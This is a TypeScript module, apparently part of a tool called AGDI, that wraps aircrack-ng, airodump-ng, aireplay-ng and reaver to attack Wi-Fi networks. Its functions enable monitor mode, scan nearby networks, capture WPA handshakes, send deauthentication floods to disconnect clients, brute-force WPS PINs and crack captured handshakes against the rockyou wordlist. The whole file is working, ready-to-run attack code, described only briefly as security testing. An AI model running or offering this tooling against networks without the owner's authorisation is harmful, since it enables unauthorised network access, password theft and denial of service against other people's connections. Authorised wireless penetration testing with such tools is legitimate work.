/**
 * AGDI WiFi Security Module
 * Wraps aircrack-ng, nmcli, iwlist for wireless security testing.
 */

import { execFile } from "node:child_process";
import { promisify } from "node:util";
import * as fs from "node:fs/promises";
import * as path from "node:path";
import * as os from "node:os";

const run = promisify(execFile);

export interface WifiNetwork {
  bssid: string;
  ssid: string;
  channel: number;
  signal: number;
  encryption: "WPA3" | "WPA2" | "WPA" | "WEP" | "Open" | "Unknown";
  hidden: boolean;
  wps?: boolean;
}

export interface HandshakeResult {
  success: boolean;
  filePath?: string;
  bssid: string;
}

export interface DeauthOptions {
  bssid: string;
  clientMac?: string;
  count?: number;
  iface: string;
}

export type WifiEvent =
  | { kind: "network_found"; network: WifiNetwork }
  | { kind: "handshake_captured"; result: HandshakeResult }
  | { kind: "deauth_sent"; target: string; count: number }
  | { kind: "status"; message: string }
  | { kind: "error"; message: string };

export type WifiListener = (event: WifiEvent) => void;

export class WifiSecurity {
  private listeners: WifiListener[] = [];
  private monitorIface: string | null = null;
  private captureDir = path.join(os.tmpdir(), "agdi-wifi");

  on(l: WifiListener): void { this.listeners.push(l); }
  private emit(e: WifiEvent): void { for (const l of this.listeners) l(e); }

  async getInterfaces(): Promise<string[]> {
    try {
      const { stdout } = await run("iwconfig", [], { timeout: 5000 });
      return stdout.split("\n").filter(l => /IEEE 802\.11/.test(l)).map(l => l.split(/\s/)[0]);
    } catch { return []; }
  }

  async enableMonitor(iface: string): Promise<string> {
    this.emit({ kind: "status", message: `Monitor mode on ${iface}` });
    try {
      await run("airmon-ng", ["check", "kill"], { timeout: 10000 });
      const { stdout } = await run("airmon-ng", ["start", iface], { timeout: 10000 });
      this.monitorIface = stdout.match(/(\w+mon)/)?.[1] ?? `${iface}mon`;
    } catch {
      await run("ip", ["link", "set", iface, "down"]);
      await run("iw", [iface, "set", "monitor", "none"]);
      await run("ip", ["link", "set", iface, "up"]);
      this.monitorIface = iface;
    }
    return this.monitorIface;
  }

  async disableMonitor(iface?: string): Promise<void> {
    const t = iface ?? this.monitorIface;
    if (!t) return;
    try { await run("airmon-ng", ["stop", t], { timeout: 10000 }); } catch {
      await run("ip", ["link", "set", t, "down"]).catch(() => {});
      await run("iw", [t, "set", "type", "managed"]).catch(() => {});
      await run("ip", ["link", "set", t, "up"]).catch(() => {});
    }
    await run("systemctl", ["start", "NetworkManager"]).catch(() => {});
    this.monitorIface = null;
  }

  async scanNetworks(): Promise<WifiNetwork[]> {
    const networks: WifiNetwork[] = [];
    try {
      const { stdout } = await run("nmcli", ["-t", "-f", "BSSID,SSID,CHAN,SIGNAL,SECURITY", "device", "wifi", "list", "--rescan", "yes"], { timeout: 30000 });
      for (const line of stdout.split("\n")) {
        if (!line.trim()) continue;
        const p = line.split(":");
        if (p.length < 11) continue;
        const bssid = p.slice(0, 6).join(":"); const rest = p.slice(6);
        const net: WifiNetwork = { bssid, ssid: rest[0] || "(hidden)", channel: parseInt(rest[1] ?? "0"), signal: parseInt(rest[2] ?? "0"), encryption: this.enc(rest[3] ?? ""), hidden: !rest[0], wps: rest[3]?.includes("WPS") };
        networks.push(net);
        this.emit({ kind: "network_found", network: net });
      }
    } catch (e) { this.emit({ kind: "error", message: `Scan failed: ${e}` }); }
    return networks;
  }

  async captureHandshake(bssid: string, ch: number, iface: string, sec = 60): Promise<HandshakeResult> {
    await fs.mkdir(this.captureDir, { recursive: true });
    const pre = path.join(this.captureDir, `hs-${Date.now()}`);
    try {
      await run("iwconfig", [iface, "channel", String(ch)]).catch(() => {});
      await run("timeout", [String(sec), "airodump-ng", "--bssid", bssid, "--channel", String(ch), "--write", pre, iface], { timeout: (sec + 5) * 1000 }).catch(() => {});
      const cap = `${pre}-01.cap`;
      const { stdout } = await run("aircrack-ng", [cap], { timeout: 10000 });
      if (/1 handshake/i.test(stdout)) {
        const r: HandshakeResult = { success: true, filePath: cap, bssid };
        this.emit({ kind: "handshake_captured", result: r }); return r;
      }
    } catch {}
    return { success: false, bssid };
  }

  async deauth(opts: DeauthOptions): Promise<void> {
    const args = ["--deauth", String(opts.count ?? 5), "-a", opts.bssid];
    if (opts.clientMac) args.push("-c", opts.clientMac);
    args.push(opts.iface);
    try {
      await run("aireplay-ng", args, { timeout: 30000 });
      this.emit({ kind: "deauth_sent", target: opts.bssid, count: opts.count ?? 5 });
    } catch (e) { this.emit({ kind: "error", message: `Deauth failed: ${e}` }); }
  }

  async testWps(bssid: string, iface: string): Promise<{ vulnerable: boolean; pin?: string }> {
    try {
      const { stdout } = await run("timeout", ["30", "reaver", "-i", iface, "-b", bssid, "-vvv", "-K", "1"], { timeout: 35000 }).catch((e: { stdout?: string }) => ({ stdout: e.stdout ?? "" }));
      const pin = stdout.match(/WPS PIN:\s*'?(\d+)/);
      return { vulnerable: !!pin, pin: pin?.[1] };
    } catch { return { vulnerable: false }; }
  }

  async crackHandshake(capFile: string, wordlist = "/usr/share/wordlists/rockyou.txt"): Promise<{ cracked: boolean; password?: string }> {
    try {
      const { stdout } = await run("aircrack-ng", ["-w", wordlist, capFile], { timeout: 600000 });
      const key = stdout.match(/KEY FOUND!\s*\[\s*(.+?)\s*\]/);
      return { cracked: !!key, password: key?.[1] };
    } catch { return { cracked: false }; }
  }

  async checkDependencies(): Promise<{ available: string[]; missing: string[] }> {
    const tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "reaver", "nmcli", "iwconfig"];
    const available: string[] = []; const missing: string[] = [];
    for (const t of tools) { try { await run("which", [t]); available.push(t); } catch { missing.push(t); } }
    return { available, missing };
  }

  private enc(s: string): WifiNetwork["encryption"] {
    if (/WPA3/i.test(s)) return "WPA3"; if (/WPA2/i.test(s)) return "WPA2";
    if (/WPA/i.test(s)) return "WPA"; if (/WEP/i.test(s)) return "WEP";
    if (!s || /^--$/.test(s)) return "Open"; return "Unknown";
  }
}

export default WifiSecurity;
